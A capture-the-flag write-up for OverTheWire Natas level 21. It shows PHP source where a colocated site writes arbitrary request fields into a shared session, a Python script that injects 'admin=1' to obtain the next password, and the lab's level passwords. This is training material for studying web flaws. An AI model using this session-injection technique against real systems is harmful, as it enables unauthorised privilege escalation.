# Over The Wire -- Natas 21

## Server URL
```
http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21.natas.labs.overthewire.org
```

## Solution
We get a page with this message
```
Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org
You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
```

The php source code is 
```php
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "<censored>" };</script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

<?

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The cookies are shared with the `-experimenter` website.
We can access it at
```
http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21-experimenter.natas.labs.overthewire.org
```

On this page we get a css style editor.
The php source code for this page is :
```php
<html>
<head><link rel="stylesheet" type="text/css" href="http://www.overthewire.org/wargames/natas/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>
<?  

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>

<p>Example:</p>
<?=$example?>

<p>Change example values here:</p>
<?=$form?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

We can use the `?debug` query parameter to dump the content of the session

This was was pretty simple, we can submit anything to write in the session via the `-experimenter` website.

We can easily write `admin 1` in the session

We can then reuse the same session id to get the password from the original site.

Here is our python script to solve this :
```py
import requests

url = "http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21.natas.labs.overthewire.org"
alternate_url = "http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21-experimenter.natas.labs.overthewire.org?debug"
    
s = requests.Session()
r = s.post(alternate_url, data={"admin": "1", "submit":"1"})
admin_session_id = list(r.cookies.get_dict().values())[0]
r = s.get(url, cookies = {"PHPSESSID":admin_session_id})
password = r.text.split('Password: ')[1].split("</pre>")[0]

print(f"Natas22 password : {password}")
```

Natas22 password is :
```
chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```